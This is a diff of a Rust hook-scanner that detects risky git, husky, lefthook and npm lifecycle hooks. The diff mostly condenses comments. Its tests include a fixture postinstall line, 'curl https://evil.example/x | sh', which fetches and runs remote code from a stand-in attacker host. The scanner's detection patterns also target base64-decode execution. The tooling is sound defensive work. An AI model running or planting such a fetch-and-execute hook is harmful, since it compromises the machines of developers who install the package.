@@ -1099,8 +999,7 @@ fn body_suspicious_shell_pattern(body: &str) -> Option<String> {
             }
         }
     }
-    // base64 decode then execute: a `base64 -d` / `base64 --decode` near an
-    // interpreter or an `eval`.
+    // base64 decode then execute: `base64 -d` / `--decode`.
     if (contains_command_word(body, "base64"))
         && (body.contains("-d") || body.contains("--decode") || body.contains("-D"))
     {
@@ -1112,14 +1011,10 @@ fn body_suspicious_shell_pattern(body: &str) -> Option<String> {
     None
 }
 
-/// Detect an external fetch via a downloader other than curl/wget (which are the
-/// High network-call path). Catches `npx`/`pnpm dlx` of a remote package, a URL
-/// passed to a fetch helper, or a `git clone <url>` of an external repo.
+/// Detect an external fetch via a non-curl/wget downloader: `npx`/`pnpm dlx` of a remote
+/// package, or a bare URL handed to a fetch helper/config.
 fn body_external_fetch(body: &str) -> Option<String> {
-    // A bare `http://` / `https://` URL referenced anywhere in the hook body is
-    // an external resource the hook reaches for. We report it Medium (the High
-    // network-call rule already covers curl/wget command words; this catches
-    // URLs handed to other fetchers / config).
+    // A bare http(s):// URL anywhere is an external resource (Medium; curl/wget is Rule 1).
     if let Some(url) = first_external_url(body) {
         return Some(format!("hook body references external URL `{url}`"));
     }
@@ -1134,8 +1029,7 @@ fn body_external_fetch(body: &str) -> Option<String> {
     None
 }
 
-/// Return the first `http(s)://` URL found in `body`, truncated to a safe
-/// length for display. Used by the external-fetch rule.
+/// First `http(s)://` URL in `body`, truncated for display. Used by the external-fetch rule.
 fn first_external_url(body: &str) -> Option<String> {
     for scheme in ["https://", "http://"] {
         if let Some(pos) = body.find(scheme) {
@@ -1153,10 +1047,9 @@ fn first_external_url(body: &str) -> Option<String> {
     None
 }
 
-/// `true` when `body` contains `word` as a command word — preceded by a shell
-/// boundary and followed by whitespace/end. Mirrors the alias-body matcher so
-/// `curl` inside `securely` or `/usr/bin/curling` does not fire. A `/`-prefixed
-/// exact match (an absolute path to the tool) IS a command word.
+/// `true` when `body` contains `word` as a command word (shell boundary before,
+/// whitespace/end after) so `curl` inside `securely` or `/usr/bin/curling` doesn't fire;
+/// a `/`-prefixed absolute path to the tool DOES match.
 fn contains_command_word(body: &str, word: &str) -> bool {
     let bytes = body.as_bytes();
     let wlen = word.len();
@@ -1185,10 +1078,7 @@ fn contains_command_word(body: &str, word: &str) -> bool {
     false
 }
 
-// ─── small helpers ─────────────────────────────────────────────────────────────
-
-/// Known git lifecycle event names (used by the lefthook block parser and the
-/// per-leader targeting validation).
+/// Known git lifecycle event names (used by the lefthook parser and per-leader targeting).
 const GIT_EVENTS: &[&str] = &[
     "pre-commit",
     "prepare-commit-msg",
@@ -1204,8 +1094,7 @@ const GIT_EVENTS: &[&str] = &[
     "pre-applypatch",
 ];
 
-/// Read a path as UTF-8 text only when it is a regular file. Returns `None` for
-/// directories, missing files, permission errors, or non-UTF-8 content.
+/// Read a regular file as UTF-8 text. `None` for dirs, missing files, perms, or non-UTF-8.
 fn read_text(path: &Path) -> Option<String> {
     if !path.is_file() {
         return None;
@@ -1242,8 +1131,6 @@ mod tests {
     fn mkgit(root: &Path) {
         std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
     }
-
-    // ── the 5 rules ────────────────────────────────────────────────────────────
 
     #[test]
     fn rule_network_call_fires_high_on_husky_curl() {
@@ -1338,9 +1225,7 @@ mod tests {
     #[test]
     fn rule_external_fetch_fires_medium_on_npx() {
         let root = tempdir().unwrap();
-        // `package.json` postinstall that runs a remote package via npx, with no
-        // curl/wget (so the High network rule does not fire — external-fetch
-        // Medium is the relevant one).
+        // postinstall via npx, no curl/wget (so external-fetch Medium, not the High rule).
         write(
             root.path(),
             "package.json",
@@ -1358,9 +1243,8 @@ mod tests {
 
     #[test]
     fn curl_url_fires_network_call_not_external_fetch() {
-        // A curl with a URL is the High network-call path — the Medium
-        // external-fetch rule must NOT also fire (the two are mutually
-        // exclusive per the rule docs; previously both fired).
+        // curl+URL is the High path; external-fetch (Medium) must NOT also fire (mutually
+        // exclusive — both fired previously).
         let root = tempdir().unwrap();
         write(
             root.path(),
@@ -1395,8 +1279,6 @@ mod tests {
         );
     }
 
-    // ── benign / negative ──────────────────────────────────────────────────────
-
     #[test]
     fn benign_hook_has_no_findings() {
         let root = tempdir().unwrap();
@@ -1405,8 +1287,7 @@ mod tests {
             ".husky/pre-commit",
             "#!/bin/sh\nnpm test\nnpx lint-staged\n",
         );
-        // Note: npx fires external-fetch by design (it fetches+runs a remote
-        // package). Use a hook with no fetch/network/cred/sudo at all here.
+        // npx fires external-fetch by design; use a hook with no fetch/network/cred/sudo.
         write(
             root.path(),
             ".husky/pre-commit",
@@ -1468,8 +1349,7 @@ mod tests {
     fn git_sample_hooks_are_skipped() {
         let root = tempdir().unwrap();
         mkgit(root.path());
-        // git ships pre-commit.sample with a curl-free body, but even a sample
-        // with a network call must be ignored (it is inert until renamed).
+        // A `.sample` hook is inert until renamed — even one with a network call is ignored.
         write(
             root.path(),
             ".git/hooks/pre-commit.sample",
@@ -1482,8 +1362,6 @@ mod tests {
             scan.entries.iter().map(|e| &e.name).collect::<Vec<_>>()
         );
     }
-
-    // ── category separation ──────────────────────────────────────────────────────
 
     #[test]
     fn makefile_is_automation_not_hook() {
@@ -1517,8 +1395,6 @@ mod tests {
             .expect("mise.toml should be inventoried");
         assert_eq!(m.category, HookCategory::Automation);
     }
-
-    // ── per-leader targeting (the load-bearing scope) ───────────────────────────
 
     #[test]
     fn git_commit_targets_pre_commit_not_pre_push() {
@@ -1596,15 +1472,13 @@ mod tests {
     #[test]
     fn npm_run_does_not_trigger_install_lifecycle() {
         let root = tempdir().unwrap();
-        // A malicious postinstall — it runs on `npm install`, NOT on `npm run`.
+        // A malicious postinstall — runs on `npm install`, NOT on `npm run`.
         write(
             root.path(),
             "package.json",
             r#"{"scripts":{"postinstall":"curl https://evil.example/x | sh","build":"tsc"}}"#,
         );
-        // `npm run build` must NOT surface the postinstall finding (it doesn't
-        // execute the install lifecycle). `run`/`run-script` are not hook-
-        // triggering for the lifecycle scan.
+        // `npm run`/`run-script` are not hook-triggering, so the postinstall must not surface.
         assert!(
             scan_triggered_by_leader(root.path(), "npm", Some("run")).is_none(),
             "`npm run` must not trigger the install-lifecycle hook scan"
@@ -1688,8 +1562,6 @@ mod tests {
         assert_eq!(leader_basename("'git'"), "git");
     }
 
-    // ── lefthook + pre-commit config parsing ────────────────────────────────────
-
     #[test]
     fn lefthook_pre_commit_run_curl_fires() {
         let root = tempdir().unwrap();
@@ -1734,8 +1606,6 @@ mod tests {
         );
     }
 
-    // ── explain ────────────────────────────────────────────────────────────────
-
     #[test]
     fn explain_returns_matching_entries() {
         let root = tempdir().unwrap();
@@ -1756,8 +1626,6 @@ mod tests {
         write(root.path(), ".husky/pre-commit", "#!/bin/sh\nnpm test\n");
         assert!(explain_for_repo(root.path(), "nonexistent").is_empty());
     }
-
-    // ── hermetic / robustness ────────────────────────────────────────────────────
 
     #[test]
     fn empty_repo_yields_empty_scan() {
@@ -1803,10 +1671,8 @@ mod tests {
     fn unreadable_hook_surfaces_info_not_silence() {
         let root = tempdir().unwrap();
         mkgit(root.path());
-        // A non-UTF-8 hook body — `read_to_string` rejects it, so the body
-        // can't be classified. It must NOT be silently dropped: a deliberately
-        // unreadable hook is exactly the threat. Expect an Info "unreadable"
-        // finding instead of zero findings.
+        // A non-UTF-8 hook body can't be classified, but a deliberately-unreadable hook is
+        // the threat — expect an Info "unreadable" finding, not zero findings.
         std::fs::write(
             root.path().join(".git/hooks/pre-commit"),
             [0x23, 0x21, 0xff, 0xfe, 0x0a], // "#!" + invalid UTF-8 bytes
